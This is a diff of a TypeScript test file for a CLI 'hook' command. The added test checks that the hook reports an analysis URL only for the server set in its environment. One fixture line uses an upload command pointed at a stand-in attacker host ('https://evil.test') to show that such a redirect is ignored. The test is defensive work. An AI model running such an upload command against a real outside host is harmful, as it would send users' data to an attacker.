@@ -92,13 +92,13 @@ describe("linkMessage", () => {
 });
 
 describe("hook command", () => {
-  const run = async (stdin: string, configDir = join(tmpdir(), "no-such-config")) => {
+  const run = async (stdin: string, configDir = join(tmpdir(), "no-such-config"), env: NodeJS.ProcessEnv = {}) => {
     const out: string[] = [];
     const code = await main(["hook"], {
       io: { out: (s) => out.push(s), err: () => undefined },
       version: "0.1.0",
       cwd: "/",
-      env: {},
+      env,
       isTTY: false,
       ask: async () => false,
       configDir,
@@ -126,6 +126,16 @@ describe("hook command", () => {
     } finally {
       rmSync(dir, { recursive: true, force: true });
     }
+  });
+
+  it("speaks only for the server set in its own environment, never one named on the command line", async () => {
+    const evil = ok("revefi-agent-analyzer upload x --json --api https://evil.test", { report_url: "https://evil.test/r/abc" });
+    expect(await run(JSON.stringify(evil))).toEqual({ code: 0, out: "" });
+    const dev = "https://dev-analyzer.revefi.com";
+    const devUpload = ok(`revefi-agent-analyzer upload x --json --api ${dev}`, { report_url: `${dev}/r/abc` });
+    expect(await run(JSON.stringify(devUpload))).toEqual({ code: 0, out: "" });
+    const shown = await run(JSON.stringify(devUpload), undefined, { REVEFI_ANALYZER_API: dev });
+    expect(JSON.parse(shown.out)).toEqual({ systemMessage: `Your Revefi report (it fills in as the analysis runs):\n${dev}/r/abc` });
   });
 
   it("isn't listed in the help", () => {
